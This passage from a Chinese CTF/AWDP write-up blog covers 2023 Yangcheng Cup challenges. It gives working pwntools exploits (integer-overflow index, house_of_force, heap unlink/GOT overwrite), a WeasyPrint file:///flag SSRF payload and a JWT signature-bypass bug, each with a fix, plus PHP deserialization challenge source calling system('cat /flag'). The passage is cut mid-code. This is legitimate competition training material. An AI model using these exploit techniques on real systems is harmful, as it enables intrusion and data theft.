<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;attachment&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åå»è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œè¿”å›ä¸€ä¸ªpdfï¼Œç”¨binwalkæå–å°±èƒ½çœ‹åˆ°æ–‡ä»¶å†…å®¹äº†</p>
<p><img src="/img/wp/2023/2023ycb-final-13.png"></p>
<h2 id="Fix-4"><a href="#Fix-4" class="headerlink" title="Fix"></a>Fix</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, make_response, render_template, flash, redirect, url_for<br><span class="hljs-keyword">from</span> flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit<br><span class="hljs-keyword">from</span> flask_weasyprint <span class="hljs-keyword">import</span> HTML, render_pdf<br><span class="hljs-keyword">from</span> werkzeug.security <span class="hljs-keyword">import</span> generate_password_hash, check_password_hash<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">10</span>)<br>app.config[<span class="hljs-string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="hljs-string">&#x27;sqlite:///users.db&#x27;</span><br><br>db = SQLAlchemy(app)<br><br>URL_REGEX = re.<span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">r&#x27;http(s)?://&#x27;</span>  <span class="hljs-comment"># http or https</span><br>    <span class="hljs-string">r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(db.Model):<br>    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)<br>    username = db.Column(db.String(<span class="hljs-number">80</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    password = db.Column(db.String(<span class="hljs-number">80</span>), nullable=<span class="hljs-literal">False</span>)<br>    is_admin = db.Column(db.Boolean, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_database</span>(<span class="hljs-params">app</span>):<br>    <span class="hljs-keyword">with</span> app.app_context():<br>        db.create_all()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> URL_REGEX.match(url):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            data = request.form<br>            hashed_password = generate_password_hash(data[<span class="hljs-string">&#x27;password&#x27;</span>])<br>            new_user = User(username=data[<span class="hljs-string">&#x27;username&#x27;</span>], password=hashed_password, is_admin=<span class="hljs-literal">False</span>)<br>            db.session.add(new_user)<br>            db.session.commit()<br><br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;User registered successfully&#x27;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;Register Error!&#x27;</span>),<span class="hljs-number">500</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;please register first!&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        data = request.form<br>        user = User.query.filter_by(username=data[<span class="hljs-string">&#x27;username&#x27;</span>]).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> check_password_hash(user.password, data[<span class="hljs-string">&#x27;password&#x27;</span>]):<br>            access_token = jwt.encode(<br>                &#123;<span class="hljs-string">&#x27;username&#x27;</span>: user.username, <span class="hljs-string">&#x27;isadmin&#x27;</span>:<span class="hljs-literal">False</span>&#125;, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br>            res = make_response(redirect(url_for(<span class="hljs-string">&#x27;ohmypdf&#x27;</span>)))<br>            res.set_cookie(<span class="hljs-string">&#x27;access_token&#x27;</span>,access_token)<br>            <span class="hljs-keyword">return</span> res, <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>,message=<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>), <span class="hljs-number">500</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>), <span class="hljs-number">200</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ohmypdf</span>():<br>    access_token = request.cookies.get(<span class="hljs-string">&#x27;access_token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> access_token:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br>    <span class="hljs-keyword">try</span>:<br>        decoded_token = jwt.decode(<br>            access_token, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>],options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>        isadmin = decoded_token[<span class="hljs-string">&#x27;isadmin&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>,message=<span class="hljs-string">&#x27;Invalid access token&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isadmin:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,message=<span class="hljs-string">&#x27;You do not have permission to access this resource. Where is the admin?!&#x27;</span>), <span class="hljs-number">403</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        <span class="hljs-keyword">if</span> is_valid_url(url):<br>            <span class="hljs-keyword">try</span>:<br>                html = HTML(url=url)<br>                pdf = html.write_pdf()<br>                response = make_response(pdf)<br>                response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;application/pdf&#x27;</span><br>                response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=output.pdf&#x27;</span><br>                <span class="hljs-keyword">return</span> response<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error generating PDF&#x27;</span>, <span class="hljs-number">500</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Invalid URL!&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>), <span class="hljs-number">200</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    create_database(app)<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure>


<p>çœ‹ä¸‹ä»£ç ä¸­å…³äºjwtçš„éƒ¨åˆ†ï¼Œå¯ä»¥ä»è¿™éƒ¨åˆ†å…¥æ‰‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">10</span>)<br><br>access_token = jwt.encode(<br>                &#123;<span class="hljs-string">&#x27;username&#x27;</span>: user.username, <span class="hljs-string">&#x27;isadmin&#x27;</span>:<span class="hljs-literal">False</span>&#125;, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br><br><br>decoded_token = jwt.decode(<br>            access_token, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>],options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>isadmin = decoded_token[<span class="hljs-string">&#x27;isadmin&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p><code>&#123;&quot;verify_signature&quot;: False&#125;</code> ä¿®æ”¹æˆ <code>&#123;&quot;verify_signature&quot;: True&#125;</code></p>
<hr>

<p><a href="https://blog.csdn.net/Jayjay___/article/details/132915944">å‚è€ƒæ–‡ç« 1</a><br><a href="https://blog.csdn.net/solitudi/article/details/109231974">å‚è€ƒæ–‡ç« 2</a></p>
<h1 id="pwn-arrary-index-bank"><a href="#pwn-arrary-index-bank" class="headerlink" title="pwn-arrary_index_bank"></a>pwn-arrary_index_bank</h1><h2 id="Break-5"><a href="#Break-5" class="headerlink" title="Break"></a>Break</h2><p>æ•´æ•°æº¢å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;account?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.readuntil(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline())<br>    <span class="hljs-keyword">return</span> d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;account?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;much?&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>d=show(-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>win=d-<span class="hljs-number">0x1426</span>+<span class="hljs-number">0x1315</span><br>e.address=d-<span class="hljs-number">0x1426</span><br><br>d=show(-<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>stack=d-<span class="hljs-number">0x30</span><br><br>you=e.address+<span class="hljs-number">0x4010</span><br>ind=(you-stack)//<span class="hljs-number">8</span><br><span class="hljs-comment">#print(show(ind))</span><br>edit(ind,<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">print</span>(edit(<span class="hljs-number">7</span>,win))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="Fix-5"><a href="#Fix-5" class="headerlink" title="Fix"></a>Fix</h2><p>ä¿®æ”¹<code>jle</code>æŒ‡ä»¤å˜æˆ<code>jbe</code></p>
<blockquote>
<p>JBEç”¨äºæ— ç¬¦å·æ•°æ¯”è¾ƒï¼ŒJLEç”¨äºæœ‰ç¬¦å·æ•°æ¯”è¾ƒ</p>
</blockquote>
<p><img src="/img/wp/2023/2023ycb-final-14.png"></p>
<p><img src="/img/wp/2023/2023ycb-final-15.png"></p>
<h1 id="pwn-easy-force"><a href="#pwn-easy-force" class="headerlink" title="pwn-easy_force"></a>pwn-easy_force</h1><h2 id="Break-6"><a href="#Break-6" class="headerlink" title="Break"></a>Break</h2><p>house_of_force</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&#x27;\n&#x27;</span>,end=<span class="hljs-literal">False</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;away&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;write?&#x27;</span>,data)<br>    <span class="hljs-keyword">if</span> end==<span class="hljs-literal">False</span>:<br>        p.readuntil(<span class="hljs-string">&#x27;balckbroad on &#x27;</span>)<br>        d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27; &#x27;</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> d<br><br>gadget=<span class="hljs-number">0x6a2226</span><br>puts=<span class="hljs-number">0x6f6a0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p</span>):<br>    <span class="hljs-comment">#gadget=int(input(&quot;asdfasdf:&quot;),16)</span><br>    chunk1=add(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">8</span>)<br>    top_chunk=chunk1+<span class="hljs-number">0x20</span><br>    to=<span class="hljs-number">0x602000</span><br>    chunk2=add(<span class="hljs-number">1</span>,(to-top_chunk))<br>    chunk3=add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+gadget.to_bytes(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;little&#x27;</span>),<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk2))<br>    p.sendline(<span class="hljs-string">&quot;asdfasdf&quot;</span>)<br>    d=p.readuntil(<span class="hljs-string">&#x27;asdfasdf&#x27;</span>,timeout=<span class="hljs-number">0.01</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;asdf&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d:<br>        <span class="hljs-keyword">return</span><br>    p.interactive()<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>     <span class="hljs-comment">#   gdb.attach(p)</span><br>        pwn(p)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">pass</span><br>    p.close()<br><br><br>    time.sleep(<span class="hljs-number">0.01</span>)<br></code></pre></td></tr></table></figure>


<h2 id="Fix-6"><a href="#Fix-6" class="headerlink" title="Fix"></a>Fix</h2><p>ä¿®æ”¹å†™å…¥æ•°æ®é•¿åº¦  <code>0x30--&gt;0x10</code></p>
<p><img src="/img/wp/2023/2023ycb-final-16.png"></p>
<h1 id="pwn-Printf-but-not-fmtstr"><a href="#pwn-Printf-but-not-fmtstr" class="headerlink" title="pwn-Printf but not fmtstr"></a>pwn-Printf but not fmtstr</h1><h2 id="Break-7"><a href="#Break-7" class="headerlink" title="Break"></a>Break</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&quot;./pwn2lib&quot;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x508</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x518</span>)<br><br><span class="hljs-comment"># one</span><br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>lbin=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=lbin-<span class="hljs-number">0x40</span>-<span class="hljs-number">62</span>*<span class="hljs-number">0x10</span>-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x1f6830</span>-<span class="hljs-number">0x430</span><br>success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;libc.address=:x&#125;</span>&quot;</span>)<br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>edit(<span class="hljs-number">2</span>,p64(lbin)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x404140</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br><br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>chunk0=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk0=:x&#125;</span>&quot;</span>)<br><br>fc=<span class="hljs-number">0x4040e0</span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x508</span>)<br><br>payload=flat(&#123;<span class="hljs-number">0</span>:[<span class="hljs-number">0</span>,<span class="hljs-number">0x501</span>,fc-<span class="hljs-number">0x18</span>,fc-<span class="hljs-number">0x10</span>],<span class="hljs-number">0x500</span>:[<span class="hljs-number">0x500</span>,<span class="hljs-number">0x520</span>]&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x4040e0</span>)*<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x404000</span>))<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x4011d6</span>))<br>free(<span class="hljs-number">1</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="Fix-7"><a href="#Fix-7" class="headerlink" title="Fix"></a>Fix</h2><p>ä¿®æ”¹pltè¡¨ä¸­çš„freeå‡½æ•°é¡¹ï¼Œä½¿å…¶åœ¨æ‰§è¡Œæ—¶è·³è½¬åˆ°è‡ªå·±æ„é€ çš„æŒ‡ä»¤ä½ç½®ï¼Œç”¨äºæ‰§è¡Œfreeå‡½æ•°å¹¶å°†æŒ‡é’ˆæ•°ç»„ä¸­è¢«é‡Šæ”¾çš„chunkçš„åœ°å€è®¾ç½®ä¸ºNULL</p>
<p><img src="/img/wp/2023/2023ycb-final-17.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023</tag>
        <tag>awdp</tag>
        <tag>ç¾ŠåŸæ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ç¾ŠåŸæ¯åˆèµ›misc&amp;web wp</title>
    <url>/posts/58b7474e/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="D0nâ€™t-pl4y-g4m3"><a href="#D0nâ€™t-pl4y-g4m3" class="headerlink" title="D0nâ€™t pl4y g4m3!!!"></a>D0nâ€™t pl4y g4m3!!!</h2><p>è®¿é—®<code>/p0p.php</code>ï¼Œè¿”å›ä¸€ä¸ª<code>hint.zip</code></p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica">Ã–<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">vO</span> <span class="hljs-variable">Ow0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ã–<span class="hljs-type">_</span><span class="hljs-number">0</span> Ã–<span class="hljs-type">_O</span> Ã–<span class="hljs-operator">.</span><span class="hljs-built_in">O</span> <span class="hljs-type">o_o</span> <span class="hljs-number">0.</span><span class="hljs-built_in">O</span> <span class="hljs-variable">OvO</span> <span class="hljs-variable">o</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> <span class="hljs-variable">o</span><span class="hljs-operator">.</span>Ã– Ã–<span class="hljs-operator">.</span>Ã– <span class="hljs-variable">Ovo</span> <span class="hljs-number">0</span><span class="hljs-type">_</span>Ã– Ã–<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ã–<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ã–<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">w</span>Ã– <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ã–<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-variable">OwO</span> <span class="hljs-variable">ov0</span> <span class="hljs-variable">owo</span> <span class="hljs-type">o_O</span> <span class="hljs-built_in">O</span><span class="hljs-operator">.</span>Ã– Ã–<span class="hljs-variable">vo</span><br></code></pre></td></tr></table></figure>

<p><a href="https://zdjd.vercel.app/">å°Šå˜Ÿå‡å˜Ÿç¿»è¯‘å™¨O.o</a>å¾—åˆ°<code>flagåœ¨/tmp/catcatf1ag.txt</code></p>
<p>åˆ©ç”¨  <a href="http://www.gem-love.com/2023/02/04/PHP-7-4-21-Development-Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">PHP&lt;&#x3D;7.4.21 Development Serveræºç æ³„éœ²æ¼æ´</a>  å¾—åˆ°æºç </p>
<p><img src="/img/wp/2023/2023ycb-1.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 302 found&quot;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pro</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rce2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$rce2</span>=<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$rce2</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>     &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yang</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ycb</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;now = <span 